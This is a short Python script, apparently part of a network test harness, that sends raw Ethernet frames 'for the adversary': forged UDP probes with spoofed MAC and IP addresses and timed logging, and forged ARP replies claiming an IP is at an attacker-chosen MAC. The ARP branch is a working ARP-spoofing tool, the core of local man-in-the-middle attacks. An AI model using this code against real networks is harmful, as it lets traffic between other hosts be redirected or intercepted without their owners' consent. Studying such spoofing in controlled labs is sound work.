#!/usr/bin/env python3
"""Raw Ethernet frame sender for the adversary: forged UDP probes or forged ARP replies."""
import socket, sys, time, struct, json
def mac(s): return bytes.fromhex(s.replace(":", ""))
def csum(b):
    if len(b) % 2: b += b"\0"
    s = sum(struct.unpack(f"!{len(b)//2}H", b)); s = (s >> 16) + (s & 0xffff); s += s >> 16; return ~s & 0xffff
kind, ifc = sys.argv[1], sys.argv[2]
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); s.bind((ifc, 0))
if kind == "udp":
    smac, dmac, sip, dip, label, n, iv, out = sys.argv[3:11]; n, iv = int(n), float(iv); log = []
    for i in range(n):
        pl = f"{label}:{i}".encode(); udp = struct.pack("!HHHH", 40000, 9900, 8 + len(pl), 0) + pl
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(udp), i & 0xffff, 0, 64, 17, 0, socket.inet_aton(sip), socket.inet_aton(dip))
        ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
        t = time.monotonic_ns(); s.send(mac(dmac) + mac(smac) + b"\x08\x00" + ip + udp); log.append((i, t)); time.sleep(iv / 1000)
    json.dump(log, open(out, "w"))
else:  # arp reply: "sip is-at smac", sent to dmac/dip
    smac, dmac, sip, dip = sys.argv[3:7]
    arp = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, 2, mac(smac), socket.inet_aton(sip), mac(dmac), socket.inet_aton(dip))
    s.send(mac(dmac) + mac(smac) + b"\x08\x06" + arp)
